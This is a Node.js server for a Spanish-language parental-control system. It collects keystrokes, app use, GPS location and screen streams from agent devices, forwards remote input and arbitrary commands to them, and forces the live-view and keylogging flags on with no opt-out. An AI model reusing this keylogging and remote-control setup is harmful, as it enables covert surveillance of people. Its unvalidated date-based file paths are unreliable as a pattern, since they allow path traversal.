const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const PDFDocument = require('pdfkit');
const config = require('./config');

const PORT = config.port;
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

// ---------- Almacenamiento de reportes (JSON por dia) ----------
const dataDir = path.join(__dirname, 'data');
const pdfDir = path.join(dataDir, 'pdfs');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
if (!fs.existsSync(pdfDir)) fs.mkdirSync(pdfDir, { recursive: true });

function blockedAppsPath() {
  return path.join(dataDir, 'blocked_apps.json');
}

function loadBlockedApps() {
  try {
    return JSON.parse(fs.readFileSync(blockedAppsPath(), 'utf8'));
  } catch (e) {
    return [];
  }
}

function saveBlockedApps(list) {
  fs.writeFileSync(blockedAppsPath(), JSON.stringify(list, null, 2));
}

function geofencesPath() {
  return path.join(dataDir, 'geofences.json');
}

function loadGeofences() {
  try {
    return JSON.parse(fs.readFileSync(geofencesPath(), 'utf8'));
  } catch (e) {
    return [];
  }
}

function saveGeofences(list) {
  fs.writeFileSync(geofencesPath(), JSON.stringify(list, null, 2));
}

function broadcastGeofences() {
  const geofences = loadGeofences();
  for (const [id, agent] of agents) {
    if (agent.ws && agent.ws.readyState === 1) {
      send(agent.ws, { type: 'config.geofences', geofences });
    }
  }
  for (const ws of panels()) {
    send(ws, { type: 'geofences.updated', geofences });
  }
}

function appusagePath(dateStr) {
  return path.join(dataDir, `appusage-${dateStr}.json`);
}

function loadAppusage(dateStr) {
  try {
    return JSON.parse(fs.readFileSync(appusagePath(dateStr), 'utf8'));
  } catch (e) {
    return {};
  }
}

function saveAppusage(dateStr, data) {
  fs.writeFileSync(appusagePath(dateStr), JSON.stringify(data, null, 2));
}

function geofenceBreachPath(dateStr) {
  return path.join(dataDir, `geofence_breach-${dateStr}.json`);
}

function loadGeofenceBreach(dateStr) {
  try {
    return JSON.parse(fs.readFileSync(geofenceBreachPath(dateStr), 'utf8'));
  } catch (e) {
    return [];
  }
}

function saveGeofenceBreach(dateStr, data) {
  fs.writeFileSync(geofenceBreachPath(dateStr), JSON.stringify(data, null, 2));
}

function broadcastBlockedApps() {
  const apps = loadBlockedApps();
  for (const [id, agent] of agents) {
    if (agent.ws && agent.ws.readyState === 1) {
      send(agent.ws, { type: 'config.blockedApps', apps });
    }
  }
  for (const ws of wss.clients) {
    if (ws.role === 'panel' && ws.readyState === 1) {
      send(ws, { type: 'blockedApps.updated', apps });
    }
  }
}

function todayStr() {
  return new Date().toLocaleDateString('en-CA');
}

function reportPath(dateStr) {
  return path.join(dataDir, `report-${dateStr}.json`);
}

function loadReport(dateStr) {
  try {
    return JSON.parse(fs.readFileSync(reportPath(dateStr), 'utf8'));
  } catch (e) {
    return {};
  }
}

function saveReport(dateStr, report) {
  fs.writeFileSync(reportPath(dateStr), JSON.stringify(report, null, 2));
}

function typingPath(dateStr) {
  return path.join(dataDir, `typing-${dateStr}.json`);
}

function loadTyping(dateStr) {
  try {
    return JSON.parse(fs.readFileSync(typingPath(dateStr), 'utf8'));
  } catch (e) {
    return {};
  }
}

function saveTyping(dateStr, data) {
  fs.writeFileSync(typingPath(dateStr), JSON.stringify(data, null, 2));
}

function locationPath(dateStr) {
  return path.join(dataDir, `location-${dateStr}.json`);
}

function loadLocation(dateStr) {
  try {
    return JSON.parse(fs.readFileSync(locationPath(dateStr), 'utf8'));
  } catch (e) {
    return {};
  }
}

function saveLocation(dateStr, data) {
  fs.writeFileSync(locationPath(dateStr), JSON.stringify(data, null, 2));
}

// ---------- Generacion de PDF diario ----------
function pdfPath(dateStr) {
  return path.join(pdfDir, `reporte-${dateStr}.pdf`);
}

function sanitizePdfText(text) {
  // pdfkit (fuente Helvetica/WinAnsi) no soporta emojis ni caracteres fuera de latin-1
  return String(text == null ? '' : text)
    .replace(/[^\x00-\xFF]/g, ' ')
    .trim();
}

function formatDur(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return (h > 0 ? `${h}h ` : '') + (m > 0 ? `${m}m ` : '') + `${s}s`;
}

async function buildPdf(date) {
  const outPath = pdfPath(date);
  const report = loadReport(date);
  const typing = loadTyping(date);

  await new Promise((resolve, reject) => {
    const doc = new PDFDocument({ size: 'A4', margin: 48 });
    const stream = fs.createWriteStream(outPath);
    stream.on('finish', resolve);
    stream.on('error', reject);
    doc.pipe(stream);

    doc.fontSize(20).text('Control parental — Reporte diario', { align: 'center' });
    doc.moveDown(0.3);
    doc.fontSize(11).text(`Fecha: ${date}`, { align: 'center' });
    doc.moveDown(1);

    // Reporte de actividad
    doc.fontSize(14).text('Reporte de actividad');
    doc.moveDown(0.3);
    const deviceNames = Object.keys(report);
    if (deviceNames.length === 0) {
      doc.fontSize(10).text('Sin actividad registrada.');
    }
    for (const deviceName of deviceNames) {
      doc.fontSize(11).text(`Dispositivo: ${deviceName}`);
      const events = (report[deviceName] || []).sort((a, b) => (a.ts < b.ts ? -1 : 1));
      const totals = new Map(); // key -> { seconds, title }
      for (let i = 0; i < events.length; i++) {
        const ev = events[i];
        const endTs = i + 1 < events.length ? events[i + 1].ts : new Date().toISOString();
        const seconds = Math.max(0, (new Date(endTs) - new Date(ev.ts)) / 1000);
        const key = ev.detected || ev.app;
        if (!totals.has(key)) totals.set(key, { seconds: 0, title: ev.title });
        totals.get(key).seconds += seconds;
        if (ev.title) totals.get(key).title = ev.title;
      }
      const rows = [...totals.entries()].sort((a, b) => b[1].seconds - a[1].seconds);
      for (const [app, info] of rows) {
        const title = info.title ? ' — ' + sanitizePdfText(info.title) : '';
        doc.fontSize(10).text(`${app}: ${formatDur(info.seconds)}${title}`);
      }
      doc.moveDown(0.6);
    }

    // Actividad de teclado
    doc.moveDown(0.5);
    doc.fontSize(14).text('Actividad de teclado');
    doc.moveDown(0.3);
    const typingDevices = Object.keys(typing);
    let hasTyping = false;
    for (const deviceName of typingDevices) {
      const entries = (typing[deviceName] || []).sort((a, b) => (a.ts < b.ts ? -1 : 1));
      for (const ev of entries) {
        hasTyping = true;
        const time = ev.ts ? ev.ts.slice(11, 19) : '';
        const app = ev.detected || ev.app;
        const title = ev.title ? ` (${sanitizePdfText(ev.title)})` : '';
        doc.font('Helvetica-Bold').fontSize(10).text(`${time} — ${app}${title}`);
        doc.font('Helvetica').fontSize(10).text(sanitizePdfText(ev.text) || ' ', { indent: 22 });
        doc.moveDown(0.5);
      }
    }
    if (!hasTyping) doc.fontSize(10).text('Sin registros de teclado.');

    doc.end();
  });
  return outPath;
}

const buildingPdf = new Set();

async function ensurePdf(date) {
  const out = pdfPath(date);
  if (fs.existsSync(out)) return out;
  if (buildingPdf.has(date)) {
    while (buildingPdf.has(date)) await new Promise((r) => setTimeout(r, 200));
    return out;
  }
  buildingPdf.add(date);
  try {
    await buildPdf(date);
  } finally {
    buildingPdf.delete(date);
  }
  return out;
}

async function ensureAllPdfs() {
  const dates = new Set();
  for (const f of fs.readdirSync(dataDir)) {
    const m = f.match(/^(?:report|typing)-(\d{4}-\d{2}-\d{2})\.json$/);
    if (m) dates.add(m[1]);
  }
  for (const date of dates) {
    try {
      await ensurePdf(date);
    } catch (e) {
      console.error(`PDF fallo para ${date}:`, e.message);
    }
  }
  console.log(`PDFs sincronizados: ${dates.size} dia(s)`);
}

// ---------- Sesiones de padres ----------
const sessions = new Map();

function newSession() {
  const token = crypto.randomBytes(24).toString('hex');
  sessions.set(token, { expires: Date.now() + 24 * 3600 * 1000 });
  return token;
}

function validToken(token) {
  const s = sessions.get(token);
  if (!s) return false;
  if (s.expires < Date.now()) {
    sessions.delete(token);
    return false;
  }
  return true;
}

// ---------- Estado en tiempo real ----------
const agents = new Map(); // deviceName -> { id, ws, deviceName, autoAcceptLive, lastSeen }
const watchers = new Map(); // agentId -> Set<ws> (paneles viendo la pantalla)

function broadcastAgents() {
  const list = [...agents.values()].map((a) => ({
    id: a.deviceName,
    deviceName: a.deviceName,
    online: a.ws && a.ws.readyState === 1,
    autoAcceptLive: true,
    keyboardMonitor: true,
    lastSeen: a.lastSeen
  }));
  for (const ws of panels()) {
    send(ws, { type: 'agents.updated', agents: list });
  }
}

function panels() {
  const out = [];
  for (const ws of wss.clients) {
    if (ws.role === 'panel') out.push(ws);
  }
  return out;
}

function streamers() {
  const out = [];
  for (const ws of wss.clients) {
    if (ws.role === 'streamer') out.push(ws);
  }
  return out;
}

function send(ws, obj) {
  if (ws && ws.readyState === 1) {
    try {
      ws.send(JSON.stringify(obj));
    } catch (e) {
      // socket cerrado
    }
  }
}

function addWatcher(agentId, ws) {
  if (!watchers.has(agentId)) watchers.set(agentId, new Set());
  watchers.get(agentId).add(ws);
}

function removeWatcher(agentId, ws) {
  const set = watchers.get(agentId);
  if (set) {
    set.delete(ws);
    if (set.size === 0) watchers.delete(agentId);
  }
}

function watcherCount(agentId) {
  const set = watchers.get(agentId);
  return set ? set.size : 0;
}

// ---------- REST API ----------
function auth(req, res, next) {
  const h = req.headers['authorization'] || '';
  const token = h.startsWith('Bearer ') ? h.slice(7) : '';
  if (!validToken(token)) {
    return res.status(401).json({ error: 'No autorizado' });
  }
  next();
}

app.post('/api/login', (req, res) => {
  if (req.body && req.body.password === config.parentPassword) {
    return res.json({ token: newSession() });
  }
  res.status(401).json({ error: 'Contraseña incorrecta' });
});

app.get('/api/agents', auth, (req, res) => {
  const list = [...agents.values()].map((a) => ({
    id: a.deviceName,
    deviceName: a.deviceName,
    online: a.ws && a.ws.readyState === 1,
    autoAcceptLive: true,
    keyboardMonitor: true,
    lastSeen: a.lastSeen
  }));
  res.json(list);
});

app.get('/api/report', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json(loadReport(date));
});

app.get('/api/activity', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json(loadReport(date));
});

app.get('/api/typing', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json(loadTyping(date));
});

app.get('/api/location', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json(loadLocation(date));
});

app.get('/api/blocked_apps', auth, (req, res) => {
  res.json(loadBlockedApps());
});

app.post('/api/blocked_apps', auth, (req, res) => {
  const { app: pkg } = req.body;
  if (!pkg || typeof pkg !== 'string') return res.status(400).json({ error: 'App requerida' });
  const list = loadBlockedApps();
  if (!list.includes(pkg.trim())) {
    list.push(pkg.trim());
    saveBlockedApps(list);
    broadcastBlockedApps();
  }
  res.json({ success: true, blockedApps: list });
});

app.delete('/api/blocked_apps/:app', auth, (req, res) => {
  const pkg = req.params.app;
  let list = loadBlockedApps();
  list = list.filter((a) => a !== pkg);
  saveBlockedApps(list);
  broadcastBlockedApps();
  res.json({ success: true, blockedApps: list });
});

app.get('/api/geofences', auth, (req, res) => {
  res.json(loadGeofences());
});

app.post('/api/geofences', auth, (req, res) => {
  const geofence = req.body;
  if (!geofence || typeof geofence !== 'object') return res.status(400).json({ error: 'Geofence requerida' });
  const list = loadGeofences();
  const id = geofence.id || crypto.randomBytes(6).toString('hex');
  const newGeofence = { ...geofence, id };
  list.push(newGeofence);
  saveGeofences(list);
  broadcastGeofences();
  res.json({ success: true, geofence: newGeofence, geofences: list });
});

app.delete('/api/geofences/:id', auth, (req, res) => {
  const id = req.params.id;
  let list = loadGeofences();
  list = list.filter((g) => g.id !== id);
  saveGeofences(list);
  broadcastGeofences();
  res.json({ success: true, geofences: list });
});

app.get('/api/appusage', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json(loadAppusage(date));
});

app.get('/api/geofence_breach', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json(loadGeofenceBreach(date));
});

app.get('/api/pdfs', auth, (req, res) => {
  let files = [];
  try {
    files = fs.readdirSync(pdfDir).filter((f) => f.endsWith('.pdf')).sort().reverse();
  } catch (e) {}
  res.json(files.map((f) => ({ file: f, date: f.replace('reporte-', '').replace('.pdf', '') })));
});

app.get(['/api/pdf', '/api/pdf/:date'], auth, async (req, res) => {
  const date = req.params.date || req.query.date || todayStr();
  try {
    const file = await ensurePdf(date);
    res.download(file, `reporte-${date}.pdf`);
  } catch (e) {
    res.status(500).json({ error: 'No se pudo generar el PDF', detail: String(e && e.message || e) });
  }
});

// ---------- WebSocket ----------
wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.role = null;

  ws.on('pong', () => {
    ws.isAlive = true;
  });

  ws.on('message', (raw, isBinary) => {
    if (isBinary) {
      if (ws.role === 'streamer') {
        for (const pws of panels()) {
          if (pws.readyState === 1) {
            try { pws.send(raw); } catch (e) {}
          }
        }
      }
      return;
    }
    let data;
    try {
      data = JSON.parse(raw);
    } catch (e) {
      return;
    }
    const type = data.type;

    if (!ws.role) {
      if (type === 'agent.hello') return handleAgentHello(ws, data);
      if (type === 'streamer.hello') return handleStreamerHello(ws, data);
      if (type === 'panel.hello' || type === 'parent.hello') return handlePanelHello(ws, data);
      return ws.close();
    }

    if (ws.role === 'agent') return handleAgentMessage(ws, data);
    if (ws.role === 'panel') return handlePanelMessage(ws, data);
    if (ws.role === 'streamer') return handleStreamerMessage(ws, data);
  });

  ws.on('close', () => {
    if (ws.role === 'agent') {
      const agentId = ws.agentId;
      if (agents.get(agentId) && agents.get(agentId).ws === ws) {
        agents.delete(agentId);
      }
      watchers.delete(agentId);
      broadcastAgents();
    } else if (ws.role === 'panel') {
      for (const [agentId, set] of watchers) {
        if (set.has(ws)) removeWatcher(agentId, ws);
      }
    } else if (ws.role === 'streamer') {
      // Avisar a los paneles que el streamer H.264 se desconecto
      for (const pws of panels()) {
        send(pws, { type: 'h264.offline' });
      }
    }
  });
});

// Intervalo de latido para detectar agentes caidos
setInterval(() => {
  for (const ws of wss.clients) {
    if (ws.isAlive === false) {
      ws.terminate();
      continue;
    }
    ws.isAlive = false;
    try {
      ws.ping();
    } catch (e) {}
  }
}, 30000);

function handleAgentHello(ws, data) {
  if (!data.agentKey || data.agentKey !== config.agentKey) {
    send(ws, { type: 'error', message: 'Clave de agente invalida' });
    return ws.close();
  }
  const deviceName = (data.deviceName || 'PC-desconocido').slice(0, 60);

  const existing = agents.get(deviceName);
  if (existing && existing.ws !== ws && existing.ws.readyState === 1) {
    existing.ws.close();
  }

  ws.role = 'agent';
  ws.agentId = deviceName;

  agents.set(deviceName, {
    deviceName,
    ws,
    autoAcceptLive: true,
    keyboardMonitor: true,
    lastSeen: Date.now()
  });

  send(ws, {
    type: 'agent.welcome',
    id: deviceName,
    autoAcceptLive: agents.get(deviceName).autoAcceptLive,
    keyboardMonitor: agents.get(deviceName).keyboardMonitor,
    blockedApps: loadBlockedApps()
  });
  broadcastAgents();
}

function handlePanelHello(ws, data) {
  if (!validToken(data.token)) {
    send(ws, { type: 'error', message: 'Sesion invalida' });
    return ws.close();
  }
  ws.role = 'panel';
  broadcastAgents();
  // Pedir SPS/PPS al streamer para que este panel pueda decodificar H.264
  for (const sws of streamers()) {
    if (sws.readyState === 1) send(sws, { type: 'h264.headers.request' });
  }
}

function handleStreamerHello(ws, data) {
  if (!data.agentKey || data.agentKey !== config.agentKey) {
    send(ws, { type: 'error', message: 'Clave de agente invalida' });
    return ws.close();
  }
  ws.role = 'streamer';
  ws.streamerId = data.streamerId || 'streamer-h264';
  send(ws, { type: 'streamer.welcome', id: ws.streamerId });
  // Avisar a todos los paneles que hay H.264 disponible
  for (const pws of panels()) {
    send(pws, { type: 'h264.online' });
  }
}

function handleStreamerMessage(ws, data) {
  switch (data.type) {
    case 'h264.headers': {
      // Reenviar SPS/PPS a los paneles para que puedan decodificar
      for (const pws of panels()) {
        send(pws, { type: 'h264.headers', sps: data.sps, pps: data.pps });
      }
      break;
    }
  }
}

function handleAgentMessage(ws, data) {
  const agentId = ws.agentId;
  const agent = agents.get(agentId);
  if (agent) agent.lastSeen = Date.now();

  switch (data.type) {
    case 'app_blocked': {
      for (const pws of panels()) {
        send(pws, { type: 'app_blocked', agentId, app: data.app, ts: data.ts });
      }
      break;
    }
    case 'activity': {
      const date = todayStr();
      const report = loadReport(date);
      if (!report[agentId]) report[agentId] = [];
      report[agentId].push({
        app: data.app,
        title: data.title,
        detected: data.detected || null,
        ts: data.ts
      });
      saveReport(date, report);
      for (const pws of panels()) {
        send(pws, { type: 'activity.updated', agentId, activity: data });
      }
      break;
    }
    case 'live.accepted': {
      for (const pws of panels()) {
        send(pws, { type: 'live.accepted', agentId, requestId: data.requestId });
      }
      break;
    }
    case 'live.denied': {
      for (const pws of panels()) {
        send(pws, { type: 'live.denied', agentId, requestId: data.requestId });
      }
      break;
    }
    case 'live.frame': {
      for (const pws of panels()) {
        send(pws, { type: 'live.frame', agentId, image: data.image });
      }
      break;
    }
    case 'live.stopped': {
      for (const pws of panels()) {
        send(pws, { type: 'live.stopped', agentId });
      }
      watchers.delete(agentId);
      break;
    }
    case 'config.applied': {
      if (agent) {
        agent.autoAcceptLive = true;
        agent.keyboardMonitor = true;
      }
      broadcastAgents();
      break;
    }
    case 'typing': {
      const date = todayStr();
      const typing = loadTyping(date);
      if (!typing[agentId]) typing[agentId] = [];

      const list = typing[agentId];
      const last = list[list.length - 1];
      const nowTs = data.ts || new Date().toISOString();
      const lastTime = last ? new Date(last.ts).getTime() : 0;
      const currTime = new Date(nowTs).getTime();
      const timeDiff = Math.abs(currTime - lastTime);

      // Si es la misma app dentro de 6 segundos y es una continuacion de escritura, consolidar
      if (last && last.app === data.app && timeDiff < 6000 && (data.text.startsWith(last.text) || last.text.startsWith(data.text))) {
        if (data.text.length >= last.text.length) {
          last.text = data.text;
        }
        last.ts = nowTs;
        last.title = data.title || last.title;
      } else {
        list.push({
          app: data.app,
          title: data.title,
          text: data.text,
          ts: nowTs
        });
      }

      saveTyping(date, typing);
      for (const pws of panels()) {
        send(pws, { type: 'typing.updated', agentId, typing: data });
      }
      break;
    }
    case 'location': {
      const date = todayStr();
      const loc = loadLocation(date);
      if (!loc[agentId]) loc[agentId] = [];

      const lastPoint = loc[agentId][loc[agentId].length - 1];
      const latDiff = lastPoint ? Math.abs(lastPoint.lat - data.lat) : 1;
      const lonDiff = lastPoint ? Math.abs(lastPoint.lon - data.lon) : 1;
      const timeDiff = lastPoint ? (Date.now() - new Date(lastPoint.ts).getTime()) : 999999;

      // Si el movimiento es minimo (< 15m) en menos de 2 minutos, actualizar el punto existente
      if (lastPoint && latDiff < 0.00015 && lonDiff < 0.00015 && timeDiff < 120000) {
        lastPoint.ts = data.ts || new Date().toISOString();
        lastPoint.accuracy = Math.round(data.accuracy || lastPoint.accuracy);
      } else {
        loc[agentId].push({
          lat: data.lat,
          lon: data.lon,
          accuracy: Math.round(data.accuracy || 0),
          speed: Math.round((data.speed || 0) * 3.6),
          ts: data.ts || new Date().toISOString()
        });
      }
      saveLocation(date, loc);
      for (const pws of panels()) {
        send(pws, { type: 'location.updated', agentId, location: data });
      }
      break;
    }
    case 'appusage': {
      const date = todayStr();
      const usage = loadAppusage(date);
      if (!usage[agentId]) usage[agentId] = [];
      usage[agentId].push({
        app: data.app,
        title: data.title,
        usage: data.usage,
        ts: data.ts
      });
      saveAppusage(date, usage);
      for (const pws of panels()) {
        send(pws, { type: 'appusage.updated', agentId, appusage: data });
      }
      break;
    }
    case 'geofence.breach': {
      const date = todayStr();
      const breaches = loadGeofenceBreach(date);
      const geofences = loadGeofences();
      const zone = geofences.find(g => g.id === data.geofenceId);
      const breach = {
        agentId,
        geofenceId: data.geofenceId,
        zone: data.zone || (zone ? zone.name : data.geofenceId),
        action: data.action || 'exit',
        lat: data.lat,
        lon: data.lon,
        distance: data.distance || null,
        ts: data.ts || Date.now()
      };
      breaches.push(breach);
      saveGeofenceBreach(date, breaches);
      for (const pws of panels()) {
        send(pws, { type: 'geofence.breach', agentId, ...breach });
      }
      break;
    }
  }
}

function handlePanelMessage(ws, data) {
  switch (data.type) {
    case 'live.start': {
      const agent = agents.get(data.agentId);
      if (!agent || !agent.ws || agent.ws.readyState !== 1) {
        return send(ws, { type: 'live.error', agentId: data.agentId, message: 'Agente no conectado' });
      }
      addWatcher(data.agentId, ws);
      send(agent.ws, {
        type: 'live.request',
        requestId: data.requestId || crypto.randomBytes(8).toString('hex')
      });
      send(ws, { type: 'live.requesting', agentId: data.agentId });
      break;
    }
    case 'live.stop': {
      const agent = agents.get(data.agentId);
      removeWatcher(data.agentId, ws);
      if (agent && agent.ws && agent.ws.readyState === 1 && watcherCount(data.agentId) === 0) {
        send(agent.ws, { type: 'live.stop' });
      }
      break;
    }
    case 'live.config': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, {
          type: 'live.config',
          frameMaxWidth: data.frameMaxWidth,
          frameQuality: data.frameQuality,
          frameIntervalSec: data.frameIntervalSec
        });
      }
      break;
    }
    case 'config.autoAccept': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, { type: 'config.autoAccept', value: true });
      }
      break;
    }
    case 'config.keyboardMonitor': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, { type: 'config.keyboardMonitor', value: true });
      }
      break;
    }
    case 'config.geofences': {
      const geofences = data.geofences || loadGeofences();
      saveGeofences(geofences);
      for (const [id, agent] of agents) {
        if (agent.ws && agent.ws.readyState === 1) {
          send(agent.ws, { type: 'config.geofences', geofences });
        }
      }
      for (const pws of panels()) {
        send(pws, { type: 'geofences.updated', geofences });
      }
      break;
    }
    case 'agents.request': {
      broadcastAgents();
      break;
    }
    case 'input.tap':
    case 'input.swipe':
    case 'input.key':
    case 'input.text': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, data);
      }
      break;
    }
    case 'command.send': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, {
          type: 'command',
          command: data.command,
          params: data.params || {}
        });
      }
      break;
    }
    case 'h264.touch': {
      for (const sws of streamers()) {
        if (sws.readyState === 1) send(sws, data);
      }
      break;
    }
  }
}

server.listen(PORT, () => {
  console.log(`Servidor de control parental en http://localhost:${PORT}`);
  ensureAllPdfs().catch((e) => console.error('PDF inicial fallo:', e.message));
});

// Re-sincroniza PDFs cada hora (genera los del dia que falten)
setInterval(() => {
  ensureAllPdfs().catch((e) => console.error('PDF periodico fallo:', e.message));
}, 60 * 60 * 1000);
